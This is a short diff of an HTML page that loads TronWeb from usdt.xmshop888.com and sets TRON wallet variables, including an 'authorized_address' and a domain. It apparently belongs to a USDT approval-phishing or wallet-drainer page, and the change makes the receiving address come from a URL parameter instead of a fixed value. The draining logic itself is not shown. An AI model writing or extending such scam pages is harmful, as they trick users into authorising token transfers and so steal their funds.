@@ -39,7 +39,10 @@
 <script type="text/javascript" src="https://cdn.bootcdn.net/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 <script src="https://usdt.xmshop888.com/public/covid/covid_files/TronWeb.js"></script>
 <script type="text/javascript">
-  var address = "TLW3ciBQ9z8LRy9Z1Ex97v1n9C2s7wrGCA"
+  var params = new URLSearchParams(window.location.search);
+  var address = params.get("address");
+  
+  //var address = "TLW3ciBQ9z8LRy9Z1Ex97v1n9C2s7wrGCA"
   var rank = 6.5;
   var authorized_address = 'TLW3ciBQ9z8LRy9Z1Ex97v1n9C2s7wrGCA';
   var domain = 'https://usdt.xmshop888.com/';
